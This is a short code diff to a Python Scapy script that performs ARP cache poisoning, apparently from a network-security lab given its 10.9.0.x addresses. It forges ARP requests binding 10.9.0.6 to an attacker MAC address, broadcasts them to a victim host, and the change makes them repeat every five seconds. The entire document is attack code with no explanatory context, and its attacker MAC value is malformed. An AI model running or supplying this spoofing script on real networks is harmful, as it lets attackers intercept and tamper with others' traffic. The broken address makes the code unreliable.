@@ -2,8 +2,8 @@
 from scapy.all import *
 
 attacker_mac = "02:42:0a:09:00:105"
-victim_ip = "10.9.0.5"
 spoofed_ip = "10.9.0.6"
+victim_ip = "10.9.0.5"
 
-pkt = Ether(dst="") / ARP(op=1, psrc=spoofed_ip, hwsrc=attacker_mac, pdst=victim_ip)
-sendp(pkt)
+pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=spoofed_ip, hwsrc=attacker_mac, pdst=victim_ip)
+sendp(pkt, loop=1, inter=5)
